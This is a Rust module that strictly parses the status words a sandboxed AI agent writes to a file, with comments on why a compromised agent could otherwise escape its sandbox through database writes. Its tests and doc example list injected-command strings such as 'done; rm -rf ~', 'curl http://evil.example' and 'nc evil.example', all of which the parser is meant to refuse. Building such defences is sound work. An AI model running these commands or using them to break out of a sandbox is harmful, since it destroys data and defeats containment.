//! The one thing a sandboxed agent is allowed to tell friring: what it is
//! doing.
//!
//! `docs/SANDBOX.md` §Status signals. An unsandboxed agent reports through
//! `friring-cli session signal`, which writes SQLite directly. Neither half of
//! that survives a boundary — the binary need not exist inside one, and
//! database write access *is* the escape ADR-29 exists to prevent, because the
//! automations stored there are shell commands the **host** runs. So a
//! sandboxed agent writes a word into a file instead, and this module is the
//! only thing that turns that word into a state friring will act on.
//!
//! Everything here treats its input as hostile, because it is: the file is
//! written from inside the boundary by an agent that may be compromised, and
//! it is the one byte stream that crosses outwards. Two rules follow, and both
//! are load-bearing rather than defensive habit:
//!
//! - **The vocabulary is closed.** [`parse_status_signal`] answers with a
//!   [`SignalState`] or with nothing. There is no branch that carries the
//!   file's own bytes onward, so no spelling of the file — however long,
//!   however quoted, however encoded — can become a string the host later
//!   interpolates into a command, a query or a path.
//! - **Rejection is total.** A file that is not exactly one known word is
//!   refused whole rather than scavenged for something usable. Scavenging is
//!   how a channel that only carries four words grows a fifth.
//!
//! Reading the file — the size cap, the refusal to follow a symlink, and the
//! atomic take that keeps the poll off anything the agent can still swap — is
//! `paths::take_session_signal`, which hands the text here. This half is pure,
//! so the vocabulary can be tested without a filesystem.

/// A lifecycle state an agent may report.
///
/// Exactly the four `friring-cli session signal --state` accepts, because both
/// channels land in the same `sessions.hook_state` column and the TUI derives
/// one status from it. A fifth state would have to be added in both places or
/// the two channels would disagree about the same session.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SignalState {
    /// The agent is up and waiting for a prompt.
    Idle,
    /// A turn is in progress.
    Working,
    /// The agent is waiting on the user — a permission or approval prompt.
    Blocked,
    /// The turn finished.
    Done,
}

impl SignalState {
    /// Every state, for exhaustive tests and pickers.
    pub const ALL: [SignalState; 4] = [
        SignalState::Idle,
        SignalState::Working,
        SignalState::Blocked,
        SignalState::Done,
    ];

    /// The word stored in `sessions.hook_state`.
    ///
    /// A `&'static str` on purpose: this — never the file's own bytes — is what
    /// reaches the database, so the set of values that column can ever hold
    /// through this channel is fixed at compile time.
    pub fn as_str(self) -> &'static str {
        match self {
            SignalState::Idle => "idle",
            SignalState::Working => "working",
            SignalState::Blocked => "blocked",
            SignalState::Done => "done",
        }
    }

    /// The state one already-trimmed word names, or `None` for anything else.
    ///
    /// Case-sensitive, because the writers are friring's own hook payloads and
    /// a case-insensitive match would only widen what an agent can spell.
    fn from_word(word: &str) -> Option<Self> {
        SignalState::ALL.into_iter().find(|s| s.as_str() == word)
    }
}

/// The state a status file reports, or `None` when it reports nothing friring
/// will act on.
///
/// The hook **appends** a line per event, so a file taken between two polls can
/// hold several: the last one is the current state, and the earlier ones are
/// history friring has no use for. Trailing blank lines are skipped (a write
/// interrupted after its newline leaves one), and the last line with anything
/// in it must be a known word on its own — a line that is *nearly* a state
/// (`working now`, `Working`, `done;rm -rf /`) rejects the file rather than
/// matching the part of it that looks familiar.
///
/// # Examples
///
/// ```
/// use friring::session::status_signal::{parse_status_signal, SignalState};
///
/// assert_eq!(parse_status_signal("working\n"), Some(SignalState::Working));
/// // The newest event wins; the ones before it are history.
/// assert_eq!(parse_status_signal("working\ndone\n"), Some(SignalState::Done));
/// // Anything else is refused whole, never scavenged.
/// assert_eq!(parse_status_signal("done; curl evil.example"), None);
/// ```
pub fn parse_status_signal(contents: &str) -> Option<SignalState> {
    let last = contents
        .lines()
        .rev()
        .map(str::trim)
        .find(|line| !line.is_empty())?;
    SignalState::from_word(last)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_state_round_trips_through_its_word() {
        for state in SignalState::ALL {
            assert_eq!(parse_status_signal(state.as_str()), Some(state));
            assert_eq!(
                parse_status_signal(&format!("{}\n", state.as_str())),
                Some(state)
            );
        }
        // The words are the ones the other channel writes, so both land in the
        // same column meaning the same thing.
        let words: Vec<&str> = SignalState::ALL.iter().map(|s| s.as_str()).collect();
        assert_eq!(words, ["idle", "working", "blocked", "done"]);
    }

    #[test]
    fn the_newest_line_is_the_state_and_blank_tails_are_skipped() {
        assert_eq!(
            parse_status_signal("idle\nworking\nblocked\ndone\n"),
            Some(SignalState::Done)
        );
        // A hook interrupted after its newline, or a file written with CRLF.
        assert_eq!(
            parse_status_signal("working\n\n\n"),
            Some(SignalState::Working)
        );
        assert_eq!(
            parse_status_signal("working\r\n"),
            Some(SignalState::Working)
        );
        assert_eq!(parse_status_signal("  done  \n"), Some(SignalState::Done));
    }

    /// The whole point of the module: a file is one of four words or it is
    /// nothing. Every entry below is something an agent inside the boundary
    /// could write, and none of them may come out the other side as anything
    /// but `None`.
    #[test]
    fn hostile_and_malformed_files_are_refused_whole() {
        for hostile in [
            "",
            "\n\n\n",
            "   ",
            // Truncated: the hook's write did not finish.
            "wor",
            "don",
            // A known word with something riding along.
            "done; rm -rf ~",
            "working && curl http://evil.example",
            "done\0",
            "done|nc evil.example 1",
            "$(id)",
            "`id`",
            "--state done",
            "state=done",
            // Case and spelling: the vocabulary is closed, not fuzzy.
            "Done",
            "DONE",
            "dOnE",
            "done!",
            "doneish",
            // A valid word buried in noise: found, but not on its own line, so
            // the file is refused rather than mined for it.
            "note: the agent is done with the task",
            // JSON, TOML, and the other formats an agent might guess at.
            "{\"state\":\"done\"}",
            "state = \"done\"",
            // A newest line that is garbage does not fall back to an older one
            // that is not: an agent must not be able to pin a stale state by
            // appending rubbish after it.
            "done\nnot-a-state",
            // Control characters and terminal escapes, which would otherwise
            // reach a status line.
            "done\u{1b}[2J",
            "\u{1b}]0;done\u{7}",
            // Unicode look-alikes of the real words.
            "dоne",
            "ｄone",
            "done\u{200b}",
        ] {
            assert_eq!(
                parse_status_signal(hostile),
                None,
                "accepted a file it must refuse: {hostile:?}"
            );
        }
    }

    /// Length alone must not decide anything: the reader caps the file, and a
    /// long file that still ends in a word is as valid as a short one, while a
    /// long word is not a word.
    #[test]
    fn length_does_not_change_the_verdict() {
        let long_history = format!("{}done\n", "working\n".repeat(400));
        assert_eq!(parse_status_signal(&long_history), Some(SignalState::Done));
        assert_eq!(parse_status_signal(&"d".repeat(4096)), None);
        assert_eq!(
            parse_status_signal(&format!("done{}", "e".repeat(4000))),
            None
        );
    }
}
